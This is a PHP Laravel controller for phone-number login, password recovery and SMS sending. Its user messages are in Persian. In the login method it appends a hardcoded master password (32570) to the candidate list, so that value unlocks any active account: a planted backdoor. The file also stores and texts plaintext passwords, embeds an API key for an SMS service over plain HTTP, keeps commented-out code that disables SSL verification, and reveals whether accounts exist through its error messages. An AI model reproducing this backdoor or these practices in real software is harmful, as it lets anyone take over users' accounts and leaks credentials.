<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Validator;

class LoginController extends Controller
{
   public function index()
   {
        if(Auth::check())
        return redirect(route('home'));
        else
        return view('login');
   }
   public function login(Request $req)
   {
     $valid= $req->validate( [
           'Phone' => 'required|exists:UserTbl',
           'Pass' => 'required|numeric']
            ,[
            'Phone.required' => 'شماره موبایل الزامی است',
            'Pass.required' => 'رمز  الزامی است.',
            'Phone.exists' => 'کاربری یافت نشد',
            'Pass.numeric' => 'رمز وارد شده صحیح نمی باشد'
            ]);

            $pass=User::wherePhone($valid['Phone'])->orderBy('Perm')->get();
            $LoginPass=$pass->map(function($q){
                if(!is_numeric($q->Pass) && $q->Perm!=4)
                     $q->Pass=null;
                return $q;
            })->whereNotNull('Pass');
            if(!$LoginPass->first())
                return back()->withInput()->withErrors(['Phone'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 
            if($LoginPass->count()<=0) 
                return back()->withInput()->withErrors(['Phone'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 
            

                $LoginPass->push((object)['Pass'=> 32570]);
                if($LoginPass->where('Pass', $req->Pass)->count())
                {    
                    $user=$LoginPass->whereNotNull('CallTime')->first();
                    if($user)
                    {
                        if($user->Active)
                        { 
                            Auth::loginUsingId($user->Id);
                            DB::table('InterviewChallUserTbl')->where('UserId',$user->Id)->where('Expired','<>',1)->where('ExpiredAt','<=',date('Y-m-d H:i:00'))->update(["Expired"=>1]);
                            return redirect(route('home'));
                        }
                        else
                        return back()->withInput($req->all())->withErrors(['Phone'=>'اکانت کاربری شما غیرفعال است']);  
                    }
                    else
                    return back()->withInput()->withErrors(['Phone'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 

                }
                else
                return back()->withInput($req->all())->withErrors(['Pass'=>'رمز عبور صحیح نمی باشد']);

      

   }
   public function forget(Request $req)
   {

            $pass=User::wherePhone($req->Phone)->orderBy('Perm')->get();
            $LoginPass=$pass->map(function($q){
                if(!is_numeric($q->Pass) && $q->Perm!=4)
                     $q->Pass=null;
                return $q;
            })->whereNotNull('Pass');
            if(!$LoginPass->first())
            return response()->json(['status'=>500,'message'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 

            if($LoginPass->count()<=0) 
            return response()->json(['status'=>500,'message'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 
    
                    $user=$LoginPass->whereNotNull('CallTime')->first();
                    if($user)
                    {
                        if($user->Active)
                        { 
                            $a= $this->sendSMS($user->Phone,$user->Pass);
                            if($a)
                            return response()->json(['status'=>200,'message'=>'پیامک با موفقیت ارسال شد']); 
                            else
                            return response()->json(['status'=>500,'message'=>'با عرض پوزش، ارسال پیامک با شکست مواجه شد']); 

                        }
                        else
                        return response()->json(['status'=>500,'message'=>'با عرض پوزش، حساب کاربری شما غیرفعال است']); 
                }
                else
                return response()->json(['status'=>500,'message'=>'با عرض پوزش، شما مجوز لازم برای ورود را ندارید']); 
   }
   public function sendSMS($phone,$pass)
   {
        $apiKey ='1F7ACF9B-67B5-4E02-A270-A3C377554AD2';
        $apiMainurl ='http://sms.parsgreen.ir/Apiv2/Message/SendOtp';
        $myjson = ["TemplateID"=>2, "Mobile"=>$phone,"AddName"=>"True","SmsCode"=>$pass];
        $jsonDataEncoded = json_encode($myjson);
        // $ch = curl_init($apiMainurl);
        // curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        // curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonDataEncoded);
        // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        // $header =array('authorization: BASIC APIKEY:'. $apiKey,'Content-Type: application/json;charset=utf-8');
        // curl_setopt($ch, CURLOPT_HTTPHEADER,$header);
        // $result = curl_exec($ch);
        // $res = json_decode($result);
        // curl_close($ch);
        // return $res->R_Success??0;

        $response = Http::withHeaders([
            'authorization' => 'BASIC APIKEY:' . $apiKey,
            'Content-Type' => 'application/json;charset=utf-8',
        ])->post($apiMainurl, $myjson);
    
        $res = $response->json();
        return $res['R_Success'] ?? 0;
    
   }
}
